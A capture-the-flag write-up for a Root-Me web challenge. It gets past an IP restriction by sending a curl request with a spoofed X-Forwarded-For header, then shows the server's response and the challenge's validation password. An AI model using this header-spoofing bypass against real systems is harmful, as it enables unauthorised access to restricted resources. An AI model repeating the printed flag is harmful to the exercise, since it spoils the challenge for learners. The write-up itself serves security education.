## HTTP - IP restriction bypass

### Task

Auth to network with IP restriction bypass and get internall auth.

### Solution

1. Read [RFC](https://repository.root-me.org/RFC/EN%20-%20rfc1918.txt?_gl=1*1idvt10*_ga*MTcxMjY3MjI3Ny4xNjYxNjEwMjA2*_ga_SRYSKX09J7*MTY2MjUwNzQzNC4xOS4xLjE2NjI1MTAxMzAuMC4wLjA.) about best practices of internal IP addresses allocation. Looks like `192.168.0.0` - good choice for some intranet IP.

2. Make **GET** request to resource with changed IP address in request header:

```bash
curl --header "X-Forwarded-For: 192.168.0.0"  http://challenge01.root-me.org/web-serveur/ch68
```

3. Get password from answer

```html
<!DOCTYPE html>
<html>
<head>
	<title>Secured Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
			<h1>Intranet</h1>
		<div>
			Well done, the validation password is: <strong>Ip_$po0Fing
</strong>
		</div>
	</body>
</html>
```

### Answer

Password is `Ip_$po0Fing`
